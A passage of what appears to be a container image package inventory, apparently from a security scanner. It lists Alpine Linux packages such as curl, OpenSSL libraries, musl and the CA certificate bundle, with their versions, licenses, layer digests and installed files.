-│     │                 │      │                ├ [57] : usr/share/ca-certificates/mozilla/Entrust_Root_Certifi
-│     │                 │      │                │        cation_Authority_-_G2.crt 
-│     │                 │      │                ├ [58] : usr/share/ca-certificates/mozilla/FIRMAPROFESIONAL_CA_
-│     │                 │      │                │        ROOT-A_WEB.crt 
-│     │                 │      │                ├ [59] : usr/share/ca-certificates/mozilla/GDCA_TrustAUTH_R5_RO
-│     │                 │      │                │        OT.crt 
-│     │                 │      │                ├ [60] : usr/share/ca-certificates/mozilla/GLOBALTRUST_2020.crt 
-│     │                 │      │                ├ [61] : usr/share/ca-certificates/mozilla/GTS_Root_R1.crt 
-│     │                 │      │                ├ [62] : usr/share/ca-certificates/mozilla/GTS_Root_R2.crt 
-│     │                 │      │                ├ [63] : usr/share/ca-certificates/mozilla/GTS_Root_R3.crt 
-│     │                 │      │                ├ [64] : usr/share/ca-certificates/mozilla/GTS_Root_R4.crt 
-│     │                 │      │                ├ [65] : usr/share/ca-certificates/mozilla/GlobalSign_ECC_Root_
-│     │                 │      │                │        CA_-_R4.crt 
-│     │                 │      │                ├ [66] : usr/share/ca-certificates/mozilla/GlobalSign_ECC_Root_
-│     │                 │      │                │        CA_-_R5.crt 
-│     │                 │      │                ├ [67] : usr/share/ca-certificates/mozilla/GlobalSign_Root_CA_-
-│     │                 │      │                │        _R3.crt 
-│     │                 │      │                ├ [68] : usr/share/ca-certificates/mozilla/GlobalSign_Root_CA_-
-│     │                 │      │                │        _R6.crt 
-│     │                 │      │                ├ [69] : usr/share/ca-certificates/mozilla/GlobalSign_Root_E46.
-│     │                 │      │                │        crt 
-│     │                 │      │                ├ [70] : usr/share/ca-certificates/mozilla/GlobalSign_Root_R46.
-│     │                 │      │                │        crt 
-│     │                 │      │                ├ [71] : usr/share/ca-certificates/mozilla/Go_Daddy_Root_Certif
-│     │                 │      │                │        icate_Authority_-_G2.crt 
-│     │                 │      │                ├ [72] : usr/share/ca-certificates/mozilla/HARICA_TLS_ECC_Root_
-│     │                 │      │                │        CA_2021.crt 
-│     │                 │      │                ├ [73] : usr/share/ca-certificates/mozilla/HARICA_TLS_RSA_Root_
-│     │                 │      │                │        CA_2021.crt 
-│     │                 │      │                ├ [74] : usr/share/ca-certificates/mozilla/Hellenic_Academic_an
-│     │                 │      │                │        d_Research_Institutions_ECC_RootCA_2015.crt 
-│     │                 │      │                ├ [75] : usr/share/ca-certificates/mozilla/Hellenic_Academic_an
-│     │                 │      │                │        d_Research_Institutions_RootCA_2015.crt 
-│     │                 │      │                ├ [76] : usr/share/ca-certificates/mozilla/HiPKI_Root_CA_-_G1.crt 
-│     │                 │      │                ├ [77] : usr/share/ca-certificates/mozilla/Hongkong_Post_Root_C
-│     │                 │      │                │        A_3.crt 
-│     │                 │      │                ├ [78] : usr/share/ca-certificates/mozilla/ISRG_Root_X1.crt 
-│     │                 │      │                ├ [79] : usr/share/ca-certificates/mozilla/ISRG_Root_X2.crt 
-│     │                 │      │                ├ [80] : usr/share/ca-certificates/mozilla/IdenTrust_Commercial
-│     │                 │      │                │        _Root_CA_1.crt 
-│     │                 │      │                ├ [81] : usr/share/ca-certificates/mozilla/IdenTrust_Public_Sec
-│     │                 │      │                │        tor_Root_CA_1.crt 
-│     │                 │      │                ├ [82] : usr/share/ca-certificates/mozilla/Izenpe.com.crt 
-│     │                 │      │                ├ [83] : usr/share/ca-certificates/mozilla/Microsec_e-Szigno_Ro
-│     │                 │      │                │        ot_CA_2009.crt 
-│     │                 │      │                ├ [84] : usr/share/ca-certificates/mozilla/Microsoft_ECC_Root_C
-│     │                 │      │                │        ertificate_Authority_2017.crt 
-│     │                 │      │                ├ [85] : usr/share/ca-certificates/mozilla/Microsoft_RSA_Root_C
-│     │                 │      │                │        ertificate_Authority_2017.crt 
-│     │                 │      │                ├ [86] : usr/share/ca-certificates/mozilla/NAVER_Global_Root_Ce
-│     │                 │      │                │        rtification_Authority.crt 
-│     │                 │      │                ├ [87] : usr/share/ca-certificates/mozilla/NetLock_Arany_=Class
-│     │                 │      │                │        _Gold=_Főtanúsítvány.crt 
-│     │                 │      │                ├ [88] : usr/share/ca-certificates/mozilla/OISTE_Server_Root_EC
-│     │                 │      │                │        C_G1.crt 
-│     │                 │      │                ├ [89] : usr/share/ca-certificates/mozilla/OISTE_Server_Root_RS
-│     │                 │      │                │        A_G1.crt 
-│     │                 │      │                ├ [90] : usr/share/ca-certificates/mozilla/OISTE_WISeKey_Global
-│     │                 │      │                │        _Root_GB_CA.crt 
-│     │                 │      │                ├ [91] : usr/share/ca-certificates/mozilla/OISTE_WISeKey_Global
-│     │                 │      │                │        _Root_GC_CA.crt 
-│     │                 │      │                ├ [92] : usr/share/ca-certificates/mozilla/QuoVadis_Root_CA_1_G
-│     │                 │      │                │        3.crt 
-│     │                 │      │                ├ [93] : usr/share/ca-certificates/mozilla/QuoVadis_Root_CA_2.crt 
-│     │                 │      │                ├ [94] : usr/share/ca-certificates/mozilla/QuoVadis_Root_CA_2_G
-│     │                 │      │                │        3.crt 
-│     │                 │      │                ├ [95] : usr/share/ca-certificates/mozilla/QuoVadis_Root_CA_3.crt 
-│     │                 │      │                ├ [96] : usr/share/ca-certificates/mozilla/QuoVadis_Root_CA_3_G
-│     │                 │      │                │        3.crt 
-│     │                 │      │                ├ [97] : usr/share/ca-certificates/mozilla/SSL.com_EV_Root_Cert
-│     │                 │      │                │        ification_Authority_ECC.crt 
-│     │                 │      │                ├ [98] : usr/share/ca-certificates/mozilla/SSL.com_EV_Root_Cert
-│     │                 │      │                │        ification_Authority_RSA_R2.crt 
-│     │                 │      │                ├ [99] : usr/share/ca-certificates/mozilla/SSL.com_Root_Certifi
-│     │                 │      │                │        cation_Authority_ECC.crt 
-│     │                 │      │                ├ [100]: usr/share/ca-certificates/mozilla/SSL.com_Root_Certifi
-│     │                 │      │                │        cation_Authority_RSA.crt 
-│     │                 │      │                ├ [101]: usr/share/ca-certificates/mozilla/SSL.com_TLS_ECC_Root
-│     │                 │      │                │        _CA_2022.crt 
-│     │                 │      │                ├ [102]: usr/share/ca-certificates/mozilla/SSL.com_TLS_RSA_Root
-│     │                 │      │                │        _CA_2022.crt 
-│     │                 │      │                ├ [103]: usr/share/ca-certificates/mozilla/SZAFIR_ROOT_CA2.crt 
-│     │                 │      │                ├ [104]: usr/share/ca-certificates/mozilla/Sectigo_Public_Serve
-│     │                 │      │                │        r_Authentication_Root_E46.crt 
-│     │                 │      │                ├ [105]: usr/share/ca-certificates/mozilla/Sectigo_Public_Serve
-│     │                 │      │                │        r_Authentication_Root_R46.crt 
-│     │                 │      │                ├ [106]: usr/share/ca-certificates/mozilla/SecureSign_Root_CA12
-│     │                 │      │                │        .crt 
-│     │                 │      │                ├ [107]: usr/share/ca-certificates/mozilla/SecureSign_Root_CA14
-│     │                 │      │                │        .crt 
-│     │                 │      │                ├ [108]: usr/share/ca-certificates/mozilla/SecureSign_Root_CA15
-│     │                 │      │                │        .crt 
-│     │                 │      │                ├ [109]: usr/share/ca-certificates/mozilla/SecureTrust_CA.crt 
-│     │                 │      │                ├ [110]: usr/share/ca-certificates/mozilla/Secure_Global_CA.crt 
-│     │                 │      │                ├ [111]: usr/share/ca-certificates/mozilla/Security_Communicati
-│     │                 │      │                │        on_ECC_RootCA1.crt 
-│     │                 │      │                ├ [112]: usr/share/ca-certificates/mozilla/Security_Communicati
-│     │                 │      │                │        on_RootCA2.crt 
-│     │                 │      │                ├ [113]: usr/share/ca-certificates/mozilla/Starfield_Root_Certi
-│     │                 │      │                │        ficate_Authority_-_G2.crt 
-│     │                 │      │                ├ [114]: usr/share/ca-certificates/mozilla/Starfield_Services_R
-│     │                 │      │                │        oot_Certificate_Authority_-_G2.crt 
-│     │                 │      │                ├ [115]: usr/share/ca-certificates/mozilla/SwissSign_Gold_CA_-_
-│     │                 │      │                │        G2.crt 
-│     │                 │      │                ├ [116]: usr/share/ca-certificates/mozilla/SwissSign_RSA_TLS_Ro
-│     │                 │      │                │        ot_CA_2022_-_1.crt 
-│     │                 │      │                ├ [117]: usr/share/ca-certificates/mozilla/T-TeleSec_GlobalRoot
-│     │                 │      │                │        _Class_2.crt 
-│     │                 │      │                ├ [118]: usr/share/ca-certificates/mozilla/T-TeleSec_GlobalRoot
-│     │                 │      │                │        _Class_3.crt 
-│     │                 │      │                ├ [119]: usr/share/ca-certificates/mozilla/TUBITAK_Kamu_SM_SSL_
-│     │                 │      │                │        Kok_Sertifikasi_-_Surum_1.crt 
-│     │                 │      │                ├ [120]: usr/share/ca-certificates/mozilla/TWCA_CYBER_Root_CA.crt 
-│     │                 │      │                ├ [121]: usr/share/ca-certificates/mozilla/TWCA_Global_Root_CA.
-│     │                 │      │                │        crt 
-│     │                 │      │                ├ [122]: usr/share/ca-certificates/mozilla/TWCA_Root_Certificat
-│     │                 │      │                │        ion_Authority.crt 
-│     │                 │      │                ├ [123]: usr/share/ca-certificates/mozilla/Telekom_Security_TLS
-│     │                 │      │                │        _ECC_Root_2020.crt 
-│     │                 │      │                ├ [124]: usr/share/ca-certificates/mozilla/Telekom_Security_TLS
-│     │                 │      │                │        _RSA_Root_2023.crt 
-│     │                 │      │                ├ [125]: usr/share/ca-certificates/mozilla/TeliaSonera_Root_CA_
-│     │                 │      │                │        v1.crt 
-│     │                 │      │                ├ [126]: usr/share/ca-certificates/mozilla/Telia_Root_CA_v2.crt 
-│     │                 │      │                ├ [127]: usr/share/ca-certificates/mozilla/TrustAsia_Global_Roo
-│     │                 │      │                │        t_CA_G3.crt 
-│     │                 │      │                ├ [128]: usr/share/ca-certificates/mozilla/TrustAsia_Global_Roo
-│     │                 │      │                │        t_CA_G4.crt 
-│     │                 │      │                ├ [129]: usr/share/ca-certificates/mozilla/TrustAsia_TLS_ECC_Ro
-│     │                 │      │                │        ot_CA.crt 
-│     │                 │      │                ├ [130]: usr/share/ca-certificates/mozilla/TrustAsia_TLS_RSA_Ro
-│     │                 │      │                │        ot_CA.crt 
-│     │                 │      │                ├ [131]: usr/share/ca-certificates/mozilla/Trustwave_Global_Cer
-│     │                 │      │                │        tification_Authority.crt 
-│     │                 │      │                ├ [132]: usr/share/ca-certificates/mozilla/Trustwave_Global_ECC
-│     │                 │      │                │        _P256_Certification_Authority.crt 
-│     │                 │      │                ├ [133]: usr/share/ca-certificates/mozilla/Trustwave_Global_ECC
-│     │                 │      │                │        _P384_Certification_Authority.crt 
-│     │                 │      │                ├ [134]: usr/share/ca-certificates/mozilla/TunTrust_Root_CA.crt 
-│     │                 │      │                ├ [135]: usr/share/ca-certificates/mozilla/UCA_Extended_Validat
-│     │                 │      │                │        ion_Root.crt 
-│     │                 │      │                ├ [136]: usr/share/ca-certificates/mozilla/UCA_Global_G2_Root.crt 
-│     │                 │      │                ├ [137]: usr/share/ca-certificates/mozilla/USERTrust_ECC_Certif
-│     │                 │      │                │        ication_Authority.crt 
-│     │                 │      │                ├ [138]: usr/share/ca-certificates/mozilla/USERTrust_RSA_Certif
-│     │                 │      │                │        ication_Authority.crt 
-│     │                 │      │                ├ [139]: usr/share/ca-certificates/mozilla/certSIGN_ROOT_CA.crt 
-│     │                 │      │                ├ [140]: usr/share/ca-certificates/mozilla/certSIGN_Root_CA_G2.
-│     │                 │      │                │        crt 
-│     │                 │      │                ├ [141]: usr/share/ca-certificates/mozilla/e-Szigno_Root_CA_201
-│     │                 │      │                │        7.crt 
-│     │                 │      │                ├ [142]: usr/share/ca-certificates/mozilla/e-Szigno_TLS_Root_CA
-│     │                 │      │                │        _2023.crt 
-│     │                 │      │                ├ [143]: usr/share/ca-certificates/mozilla/ePKI_Root_Certificat
-│     │                 │      │                │        ion_Authority.crt 
-│     │                 │      │                ├ [144]: usr/share/ca-certificates/mozilla/emSign_ECC_Root_CA_-
-│     │                 │      │                │        _C3.crt 
-│     │                 │      │                ├ [145]: usr/share/ca-certificates/mozilla/emSign_ECC_Root_CA_-
-│     │                 │      │                │        _G3.crt 
-│     │                 │      │                ├ [146]: usr/share/ca-certificates/mozilla/emSign_Root_CA_-_C1.
-│     │                 │      │                │        crt 
-│     │                 │      │                ├ [147]: usr/share/ca-certificates/mozilla/emSign_Root_CA_-_G1.
-│     │                 │      │                │        crt 
-│     │                 │      │                ├ [148]: usr/share/ca-certificates/mozilla/vTrus_ECC_Root_CA.crt 
-│     │                 │      │                ╰ [149]: usr/share/ca-certificates/mozilla/vTrus_Root_CA.crt 
-│     │                 │      ╰ AnalyzedBy    : apk 
-│     │                 ├ [10] ╭ ID            : ca-certificates-bundle@20251003-r0 
-│     │                 │      ├ Name          : ca-certificates-bundle 
-│     │                 │      ├ Identifier     ╭ PURL: pkg:apk/alpine/ca-certificates-bundle@20251003-r0?arch=
-│     │                 │      │                │       x86_64&distro=3.24.0_alpha20260127 
-│     │                 │      │                ╰ UID : f667a2210d1d97c1 
-│     │                 │      ├ Version       : 20251003-r0 
-│     │                 │      ├ Arch          : x86_64 
-│     │                 │      ├ SrcName       : ca-certificates 
-│     │                 │      ├ SrcVersion    : 20251003-r0 
-│     │                 │      ├ Licenses       ╭ [0]: MPL-2.0 
-│     │                 │      │                ╰ [1]: MIT 
-│     │                 │      ├ Maintainer    : Natanael Copa <ncopa@alpinelinux.org> 
-│     │                 │      ├ Layer          ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94
-│     │                 │      │                │         edd8ebe468fc57d07e 
-│     │                 │      │                ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0
-│     │                 │      │                          961a5292bd158a4dcf 
-│     │                 │      ├ Digest        : sha1:63ebe72ba79f548b6cdc8a9894e16a90d80f42b0 
-│     │                 │      ├ InstalledFiles ╭ [0]: etc/ssl/cert.pem 
-│     │                 │      │                ├ [1]: etc/ssl/certs/ca-certificates.crt 
-│     │                 │      │                ├ [2]: etc/ssl1.1/cert.pem 
-│     │                 │      │                ╰ [3]: etc/ssl1.1/certs 
-│     │                 │      ╰ AnalyzedBy    : apk 
-│     │                 ├ [11] ╭ ID            : curl@8.20.0-r0 
-│     │                 │      ├ Name          : curl 
-│     │                 │      ├ Identifier     ╭ PURL: pkg:apk/alpine/curl@8.20.0-r0?arch=x86_64&distro=3.24.0
-│     │                 │      │                │       _alpha20260127 
-│     │                 │      │                ╰ UID : 5e28fa437371368 
-│     │                 │      ├ Version       : 8.20.0-r0 
-│     │                 │      ├ Arch          : x86_64 
-│     │                 │      ├ SrcName       : curl 
-│     │                 │      ├ SrcVersion    : 8.20.0-r0 
-│     │                 │      ├ Licenses       ─ [0]: curl 
-│     │                 │      ├ Maintainer    : Achill Gilgenast <achill@achill.org> 
-│     │                 │      ├ DependsOn      ╭ [0]: libcurl@8.20.0-r0 
-│     │                 │      │                ├ [1]: musl@1.2.5-r21 
-│     │                 │      │                ╰ [2]: zlib@1.3.1-r2 
-│     │                 │      ├ Layer          ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94
-│     │                 │      │                │         edd8ebe468fc57d07e 
-│     │                 │      │                ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0
-│     │                 │      │                          961a5292bd158a4dcf 
-│     │                 │      ├ Digest        : sha1:2d8b7f524aa10c08aa626d74492f525023c3f42d 
-│     │                 │      ├ InstalledFiles ╭ [0]: usr/bin/curl 
-│     │                 │      │                ╰ [1]: usr/bin/wcurl 
-│     │                 │      ╰ AnalyzedBy    : apk 
-│     │                 ├ [12] ╭ ID            : libapk@3.0.3-r2 
-│     │                 │      ├ Name          : libapk 
-│     │                 │      ├ Identifier     ╭ PURL: pkg:apk/alpine/libapk@3.0.3-r2?arch=x86_64&distro=3.24.
-│     │                 │      │                │       0_alpha20260127 
-│     │                 │      │                ╰ UID : b89dd03434499eb0 
-│     │                 │      ├ Version       : 3.0.3-r2 
-│     │                 │      ├ Arch          : x86_64 
-│     │                 │      ├ SrcName       : apk-tools 
-│     │                 │      ├ SrcVersion    : 3.0.3-r2 
-│     │                 │      ├ Licenses       ─ [0]: GPL-2.0-only 
-│     │                 │      ├ Maintainer    : Natanael Copa <ncopa@alpinelinux.org> 
-│     │                 │      ├ DependsOn      ╭ [0]: libcrypto3@3.5.6-r0 
-│     │                 │      │                ├ [1]: libssl3@3.5.6-r0 
-│     │                 │      │                ├ [2]: musl@1.2.5-r21 
-│     │                 │      │                ╰ [3]: zlib@1.3.1-r2 
-│     │                 │      ├ Layer          ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94
-│     │                 │      │                │         edd8ebe468fc57d07e 
-│     │                 │      │                ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0
-│     │                 │      │                          961a5292bd158a4dcf 
-│     │                 │      ├ Digest        : sha1:2f13cdf8074b5e0727e0c9a86991cacdf7f1c02f 
-│     │                 │      ├ InstalledFiles ─ [0]: usr/lib/libapk.so.3.0.0 
-│     │                 │      ╰ AnalyzedBy    : apk 
-│     │                 ├ [13] ╭ ID            : libcrypto3@3.5.6-r0 
-│     │                 │      ├ Name          : libcrypto3 
-│     │                 │      ├ Identifier     ╭ PURL: pkg:apk/alpine/libcrypto3@3.5.6-r0?arch=x86_64&distro=3
-│     │                 │      │                │       .24.0_alpha20260127 
-│     │                 │      │                ╰ UID : 707cad20ed789797 
-│     │                 │      ├ Version       : 3.5.6-r0 
-│     │                 │      ├ Arch          : x86_64 
-│     │                 │      ├ SrcName       : openssl 
-│     │                 │      ├ SrcVersion    : 3.5.6-r0 
-│     │                 │      ├ Licenses       ─ [0]: Apache-2.0 
-│     │                 │      ├ Maintainer    : Natanael Copa <ncopa@alpinelinux.org> 
-│     │                 │      ├ DependsOn      ─ [0]: musl@1.2.5-r21 
-│     │                 │      ├ Layer          ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94
-│     │                 │      │                │         edd8ebe468fc57d07e 
-│     │                 │      │                ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0
-│     │                 │      │                          961a5292bd158a4dcf 
-│     │                 │      ├ Digest        : sha1:dd0379d1ccba9bd4fda563425483a906105b9371 
-│     │                 │      ├ InstalledFiles ╭ [0]: etc/ssl/ct_log_list.cnf 
-│     │                 │      │                ├ [1]: etc/ssl/ct_log_list.cnf.dist 
-│     │                 │      │                ├ [2]: etc/ssl/openssl.cnf 
-│     │                 │      │                ├ [3]: etc/ssl/openssl.cnf.dist 
-│     │                 │      │                ├ [4]: usr/lib/libcrypto.so.3 
-│     │                 │      │                ├ [5]: usr/lib/engines-3/afalg.so 
-│     │                 │      │                ├ [6]: usr/lib/engines-3/capi.so 
-│     │                 │      │                ├ [7]: usr/lib/engines-3/loader_attic.so 
-│     │                 │      │                ├ [8]: usr/lib/engines-3/padlock.so 
-│     │                 │      │                ╰ [9]: usr/lib/ossl-modules/legacy.so 
-│     │                 │      ╰ AnalyzedBy    : apk 
-│     │                 ├ [14] ╭ ID            : libcurl@8.20.0-r0 
-│     │                 │      ├ Name          : libcurl 
-│     │                 │      ├ Identifier     ╭ PURL: pkg:apk/alpine/libcurl@8.20.0-r0?arch=x86_64&distro=3.2
-│     │                 │      │                │       4.0_alpha20260127 
-│     │                 │      │                ╰ UID : 777f0bb85a2f47f4 
-│     │                 │      ├ Version       : 8.20.0-r0 
-│     │                 │      ├ Arch          : x86_64 
-│     │                 │      ├ SrcName       : curl 
-│     │                 │      ├ SrcVersion    : 8.20.0-r0 
-│     │                 │      ├ Licenses       ─ [0]: curl 
-│     │                 │      ├ Maintainer    : Achill Gilgenast <achill@achill.org> 
-│     │                 │      ├ DependsOn      ╭ [0] : brotli-libs@1.2.0-r1 
-│     │                 │      │                ├ [1] : c-ares@1.34.6-r0 
-│     │                 │      │                ├ [2] : ca-certificates-bundle@20251003-r0 
-│     │                 │      │                ├ [3] : libcrypto3@3.5.6-r0 
-│     │                 │      │                ├ [4] : libidn2@2.3.8-r0 
-│     │                 │      │                ├ [5] : libpsl@0.21.5-r3 
-│     │                 │      │                ├ [6] : libssl3@3.5.6-r0 
-│     │                 │      │                ├ [7] : musl@1.2.5-r21 
-│     │                 │      │                ├ [8] : nghttp2-libs@1.69.0-r0 
-│     │                 │      │                ├ [9] : zlib@1.3.1-r2 
-│     │                 │      │                ╰ [10]: zstd-libs@1.5.7-r2 
-│     │                 │      ├ Layer          ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94
-│     │                 │      │                │         edd8ebe468fc57d07e 
-│     │                 │      │                ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0
-│     │                 │      │                          961a5292bd158a4dcf 
-│     │                 │      ├ Digest        : sha1:949b80acbc11bee17e05d064c8d43730e1df5ac3 
-│     │                 │      ├ InstalledFiles ╭ [0]: usr/lib/libcurl.so.4 
-│     │                 │      │                ╰ [1]: usr/lib/libcurl.so.4.8.0 
-│     │                 │      ╰ AnalyzedBy    : apk 
-│     │                 ├ [15] ╭ ID            : libidn2@2.3.8-r0 
-│     │                 │      ├ Name          : libidn2 
-│     │                 │      ├ Identifier     ╭ PURL: pkg:apk/alpine/libidn2@2.3.8-r0?arch=x86_64&distro=3.24
-│     │                 │      │                │       .0_alpha20260127 
-│     │                 │      │                ╰ UID : 9d1edbdcf8722d90 
-│     │                 │      ├ Version       : 2.3.8-r0 
-│     │                 │      ├ Arch          : x86_64 
-│     │                 │      ├ SrcName       : libidn2 
-│     │                 │      ├ SrcVersion    : 2.3.8-r0 
-│     │                 │      ├ Licenses       ╭ [0]: GPL-2.0-or-later 
-│     │                 │      │                ╰ [1]: LGPL-3.0-or-later 
-│     │                 │      ├ Maintainer    : Natanael Copa <ncopa@alpinelinux.org> 
-│     │                 │      ├ DependsOn      ╭ [0]: libunistring@1.4.2-r0 
-│     │                 │      │                ╰ [1]: musl@1.2.5-r21 
-│     │                 │      ├ Layer          ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94
-│     │                 │      │                │         edd8ebe468fc57d07e 
-│     │                 │      │                ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0
-│     │                 │      │                          961a5292bd158a4dcf 
-│     │                 │      ├ Digest        : sha1:ae187b51fa0223e13d8a4df74b8e90912f2144d8 
-│     │                 │      ├ InstalledFiles ╭ [0]: usr/lib/libidn2.so.0 
-│     │                 │      │                ╰ [1]: usr/lib/libidn2.so.0.4.0 
-│     │                 │      ╰ AnalyzedBy    : apk 
-│     │                 ├ [16] ╭ ID            : libpsl@0.21.5-r3 
-│     │                 │      ├ Name          : libpsl 
-│     │                 │      ├ Identifier     ╭ PURL: pkg:apk/alpine/libpsl@0.21.5-r3?arch=x86_64&distro=3.24
-│     │                 │      │                │       .0_alpha20260127 
-│     │                 │      │                ╰ UID : 56f2b91fcddf2044 
-│     │                 │      ├ Version       : 0.21.5-r3 
-│     │                 │      ├ Arch          : x86_64 
-│     │                 │      ├ SrcName       : libpsl 
-│     │                 │      ├ SrcVersion    : 0.21.5-r3 
-│     │                 │      ├ Licenses       ─ [0]: MIT 
-│     │                 │      ├ Maintainer    : Natanael Copa <ncopa@alpinelinux.org> 
-│     │                 │      ├ DependsOn      ╭ [0]: libidn2@2.3.8-r0 
-│     │                 │      │                ├ [1]: libunistring@1.4.2-r0 
-│     │                 │      │                ╰ [2]: musl@1.2.5-r21 
-│     │                 │      ├ Layer          ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94
-│     │                 │      │                │         edd8ebe468fc57d07e 
-│     │                 │      │                ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0
-│     │                 │      │                          961a5292bd158a4dcf 
-│     │                 │      ├ Digest        : sha1:9103905efb1892668c2ffcd27a887ea432feb5ca 
-│     │                 │      ├ InstalledFiles ╭ [0]: usr/lib/libpsl.so.5 
-│     │                 │      │                ╰ [1]: usr/lib/libpsl.so.5.3.5 
-│     │                 │      ╰ AnalyzedBy    : apk 
-│     │                 ├ [17] ╭ ID            : libssl3@3.5.6-r0 
-│     │                 │      ├ Name          : libssl3 
-│     │                 │      ├ Identifier     ╭ PURL: pkg:apk/alpine/libssl3@3.5.6-r0?arch=x86_64&distro=3.24
-│     │                 │      │                │       .0_alpha20260127 
-│     │                 │      │                ╰ UID : 422e39507fffb47e 
-│     │                 │      ├ Version       : 3.5.6-r0 
-│     │                 │      ├ Arch          : x86_64 
-│     │                 │      ├ SrcName       : openssl 
-│     │                 │      ├ SrcVersion    : 3.5.6-r0 
-│     │                 │      ├ Licenses       ─ [0]: Apache-2.0 
-│     │                 │      ├ Maintainer    : Natanael Copa <ncopa@alpinelinux.org> 
-│     │                 │      ├ DependsOn      ╭ [0]: libcrypto3@3.5.6-r0 
-│     │                 │      │                ╰ [1]: musl@1.2.5-r21 
-│     │                 │      ├ Layer          ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94
-│     │                 │      │                │         edd8ebe468fc57d07e 
-│     │                 │      │                ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0
-│     │                 │      │                          961a5292bd158a4dcf 
-│     │                 │      ├ Digest        : sha1:b593e93024b096c1ed37459e8326b952b6491fec 
-│     │                 │      ├ InstalledFiles ─ [0]: usr/lib/libssl.so.3 
-│     │                 │      ╰ AnalyzedBy    : apk 
-│     │                 ├ [18] ╭ ID            : libunistring@1.4.2-r0 
-│     │                 │      ├ Name          : libunistring 
-│     │                 │      ├ Identifier     ╭ PURL: pkg:apk/alpine/libunistring@1.4.2-r0?arch=x86_64&distro
-│     │                 │      │                │       =3.24.0_alpha20260127 
-│     │                 │      │                ╰ UID : d9278f842f49023f 
-│     │                 │      ├ Version       : 1.4.2-r0 
-│     │                 │      ├ Arch          : x86_64 
-│     │                 │      ├ SrcName       : libunistring 
-│     │                 │      ├ SrcVersion    : 1.4.2-r0 
-│     │                 │      ├ Licenses       ╭ [0]: GPL-2.0-or-later 
-│     │                 │      │                ╰ [1]: LGPL-3.0-or-later 
-│     │                 │      ├ Maintainer    : Natanael Copa <ncopa@alpinelinux.org> 
-│     │                 │      ├ DependsOn      ─ [0]: musl@1.2.5-r21 
-│     │                 │      ├ Layer          ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94
-│     │                 │      │                │         edd8ebe468fc57d07e 
-│     │                 │      │                ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0
-│     │                 │      │                          961a5292bd158a4dcf 
-│     │                 │      ├ Digest        : sha1:f509c801d070f8ea9f7400d5093c888ff1fee02e 
-│     │                 │      ├ InstalledFiles ╭ [0]: usr/lib/libunistring.so.5 
-│     │                 │      │                ╰ [1]: usr/lib/libunistring.so.5.2.1 
-│     │                 │      ╰ AnalyzedBy    : apk 
-│     │                 ├ [19] ╭ ID            : mimalloc2@2.2.7-r0 
-│     │                 │      ├ Name          : mimalloc2 
-│     │                 │      ├ Identifier     ╭ PURL: pkg:apk/alpine/mimalloc2@2.2.7-r0?arch=x86_64&distro=3.
-│     │                 │      │                │       24.0_alpha20260127 
-│     │                 │      │                ╰ UID : ac48b87a7770f09a 
-│     │                 │      ├ Version       : 2.2.7-r0 
-│     │                 │      ├ Arch          : x86_64 
-│     │                 │      ├ SrcName       : mimalloc2 
-│     │                 │      ├ SrcVersion    : 2.2.7-r0 
-│     │                 │      ├ Licenses       ─ [0]: MIT 
-│     │                 │      ├ Maintainer    : Jakub Jirutka <jakub@jirutka.cz> 
-│     │                 │      ├ DependsOn      ─ [0]: musl@1.2.5-r21 
-│     │                 │      ├ Layer          ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94
-│     │                 │      │                │         edd8ebe468fc57d07e 
-│     │                 │      │                ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0
-│     │                 │      │                          961a5292bd158a4dcf 
-│     │                 │      ├ Digest        : sha1:5c7f1b16b4cddf1bb6f6547cd8682ee89a52426d 
-│     │                 │      ├ InstalledFiles ╭ [0]: usr/lib/libmimalloc-secure.so.2 
-│     │                 │      │                ├ [1]: usr/lib/libmimalloc-secure.so.2.2 
-│     │                 │      │                ├ [2]: usr/lib/libmimalloc.so.2 
-│     │                 │      │                ╰ [3]: usr/lib/libmimalloc.so.2.2 
-│     │                 │      ╰ AnalyzedBy    : apk 
-│     │                 ├ [20] ╭ ID            : musl@1.2.5-r21 
-│     │                 │      ├ Name          : musl 
-│     │                 │      ├ Identifier     ╭ PURL: pkg:apk/alpine/musl@1.2.5-r21?arch=x86_64&distro=3.24.0
-│     │                 │      │                │       _alpha20260127 
-│     │                 │      │                ╰ UID : a7bafcf4eaef5646 
-│     │                 │      ├ Version       : 1.2.5-r21 
-│     │                 │      ├ Arch          : x86_64 
-│     │                 │      ├ SrcName       : musl 
-│     │                 │      ├ SrcVersion    : 1.2.5-r21 
-│     │                 │      ├ Licenses       ─ [0]: MIT 
-│     │                 │      ├ Maintainer    : Natanael Copa <ncopa@alpinelinux.org> 
-│     │                 │      ├ Layer          ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e94
-│     │                 │      │                │         edd8ebe468fc57d07e 
-│     │                 │      │                ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2ae0
-│     │                 │      │                          961a5292bd158a4dcf 
-│     │                 │      ├ Digest        : sha1:4dcd8f28bb875b9a45d3c7afbafcb7c063ddcc4c 
-│     │                 │      ├ InstalledFiles ╭ [0]: lib/ld-musl-x86_64.so.1 
